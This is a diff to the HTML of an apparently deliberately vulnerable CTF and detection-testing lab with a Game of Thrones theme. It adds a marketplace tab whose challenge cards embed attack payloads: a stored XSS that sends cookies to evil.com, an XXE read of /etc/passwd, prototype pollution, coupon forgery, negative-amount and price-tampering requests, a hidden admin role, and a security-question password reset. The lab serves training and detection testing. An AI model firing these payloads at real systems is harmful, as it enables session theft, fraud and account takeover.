@@ -174,7 +174,7 @@
           <span class="runner-counter" id="runner-counter">0 / 0</span>
         </div>
         <div class="runner-info">
-          Fires all 30 vulnerability endpoints sequentially, generating a burst of OpenTelemetry traces in OCI APM.
+          Fires all 48 vulnerability endpoints sequentially, generating a burst of OpenTelemetry traces in OCI APM.
           Use after configuring detection rules to validate they trigger.
         </div>
       </div>
@@ -282,6 +282,7 @@
         <button class="tab-btn" data-subtab="config">Misconfig (A05)</button>
         <button class="tab-btn" data-subtab="ssrf">SSRF (A10)</button>
         <button class="tab-btn" data-subtab="logging">Logging (A09)</button>
+        <button class="tab-btn" data-subtab="marketplace">Marketplace</button>
       </div>
 
       <!-- Injection subtab -->
@@ -437,6 +438,103 @@
       </div>
     </div>
 
+      <!-- Marketplace subtab (Enhanced Juice Shop-style) -->
+      <div class="tab-content" id="subtab-marketplace">
+        <div class="vuln-grid">
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/shop/reviews/1', {author:'cersei.lannister',rating:1,comment:'<script>document.location=&quot;http://evil.com/?c=&quot;+document.cookie</script>'})">
+            <div class="card-header"><span class="card-icon">&#128172;</span><h3>Stored XSS in Reviews</h3></div>
+            <p>Submit a product review containing <code>&lt;script&gt;</code> tags. Forged identity also accepted.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A03</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/shop/coupons/encode-sample')">
+            <div class="card-header"><span class="card-icon">&#127915;</span><h3>Coupon Encoding Leak</h3></div>
+            <p>Get the coupon encoding scheme. Decode, forge a 100% coupon, re-encode.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A02</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/shop/coupon/apply', {encoded:btoa('SKPCOUPON|FORGED100|100|2099-12-31')})">
+            <div class="card-header"><span class="card-icon">&#127915;</span><h3>Forge 100% Coupon</h3></div>
+            <p>Submit a forged encoded coupon for 100% discount.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A02</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/shop/coupon/apply', {code:'VALAR50'})">
+            <div class="card-header"><span class="card-icon">&#9200;</span><h3>Expired Coupon Reuse</h3></div>
+            <p>Use coupon <code>VALAR50</code> — it's expired but the server doesn't enforce expiry.</p>
+            <div class="card-meta"><span class="badge badge-medium">Medium</span><span class="badge badge-owasp">A04</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/wallet/balance?username=cersei.lannister')">
+            <div class="card-header"><span class="card-icon">&#128176;</span><h3>Wallet IDOR</h3></div>
+            <p>Check Cersei's gold balance by passing her username. No auth required.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A01</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/wallet/transfer', {from:'cersei.lannister',to:'hacker',amount:-50000})">
+            <div class="card-header"><span class="card-icon">&#128184;</span><h3>Negative Gold Transfer</h3></div>
+            <p>Transfer <code>-50000</code> gold — negative amount reverses the flow.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A04</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/shop/purchase-enhanced', {item_id:1,quantity:-5,username:'hacker'})">
+            <div class="card-header"><span class="card-icon">&#128722;</span><h3>Negative Quantity Purchase</h3></div>
+            <p>Purchase with quantity <code>-5</code> to get PAID instead of paying.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A04</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/shop/purchase-enhanced', {item_id:1,quantity:1,price:1,username:'hacker'})">
+            <div class="card-header"><span class="card-icon">&#128184;</span><h3>Price Tampering</h3></div>
+            <p>Override server price: buy a 15000g sword for <code>1 gold</code>.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A04</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="sendTradeXXE()">
+            <div class="card-header"><span class="card-icon">&#128220;</span><h3>XXE Trade Import</h3></div>
+            <p>Import XML trade agreement with <code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
+            <div class="card-meta"><span class="badge badge-critical">Critical</span><span class="badge badge-owasp">A05</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/users/change-allegiance', {username:'jon.snow',house:'House Lannister'})">
+            <div class="card-header"><span class="card-icon">&#9876;</span><h3>CSRF Allegiance Change</h3></div>
+            <p>Change Jon Snow's allegiance without CSRF token. No auth required.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A01</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/auth/security-question?username=jon.snow')">
+            <div class="card-header"><span class="card-icon">&#128270;</span><h3>OSINT Security Question</h3></div>
+            <p>Get Jon Snow's security question. The answer is publicly known GoT trivia.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A07</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/auth/reset-password-security', {username:'jon.snow',answer:'ghost',new_password:'hacked123'})">
+            <div class="card-header"><span class="card-icon">&#128273;</span><h3>OSINT Password Reset</h3></div>
+            <p>Reset Jon Snow's password using his direwolf's name as the answer.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A07</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/auth/register-enhanced', {username:'hacker_'+Date.now(),password:'test',role:'admin'})">
+            <div class="card-header"><span class="card-icon">&#128081;</span><h3>Hidden Admin Role</h3></div>
+            <p>Register with hidden <code>role=admin</code> parameter for privilege escalation.</p>
+            <div class="card-meta"><span class="badge badge-critical">Critical</span><span class="badge badge-owasp">A04</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/feedback/captcha')">
+            <div class="card-header"><span class="card-icon">&#129302;</span><h3>CAPTCHA Leak</h3></div>
+            <p>CAPTCHA answer is in the response! Submit feedback without solving it.</p>
+            <div class="card-meta"><span class="badge badge-medium">Medium</span><span class="badge badge-owasp">A07</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCallPost('/portal/api/config/update', {__proto__:{isAdmin:true},constructor:{prototype:{polluted:true}}})">
+            <div class="card-header"><span class="card-icon">&#128163;</span><h3>Prototype Pollution</h3></div>
+            <p>Deep merge with <code>__proto__</code> keys to pollute app config.</p>
+            <div class="card-meta"><span class="badge badge-critical">Critical</span><span class="badge badge-owasp">A03</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/score-board')">
+            <div class="card-header"><span class="card-icon">&#127942;</span><h3>Hidden Score Board</h3></div>
+            <p>Find the secret score board endpoint. This IS the first challenge!</p>
+            <div class="card-meta"><span class="badge badge-low">Low</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/shop/deleted-products')">
+            <div class="card-header"><span class="card-icon">&#128465;</span><h3>Deleted Products</h3></div>
+            <p>Find soft-deleted products — normally only discoverable via SQL injection.</p>
+            <div class="card-meta"><span class="badge badge-medium">Medium</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+          <div class="vuln-card" onclick="apiCall('/portal/api/admin/panel')">
+            <div class="card-header"><span class="card-icon">&#128272;</span><h3>Admin Panel (No Auth)</h3></div>
+            <p>Hidden admin panel with no authentication. Full access to wallets, users, config.</p>
+            <div class="card-meta"><span class="badge badge-high">High</span><span class="badge badge-owasp">A01</span><span class="badge badge-flag">FLAG</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
     <!-- ═══════ GOAD Lab Tab ═══════ -->
     <div class="tab-content" id="tab-goad">
       <div class="section-header"><h2>GOAD Active Directory Lab</h2><span class="badge badge-goad section-badge">Live Integration</span></div>
@@ -547,7 +645,7 @@
         <h3>Your Progress</h3>
         <div class="score-bar">
           <div class="progress"><div class="progress-fill" id="ctf-progress" style="width:0%"></div></div>
-          <span class="score-text" id="ctf-score">0 / 30</span>
+          <span class="score-text" id="ctf-score">0 / 48</span>
         </div>
       </div>
 
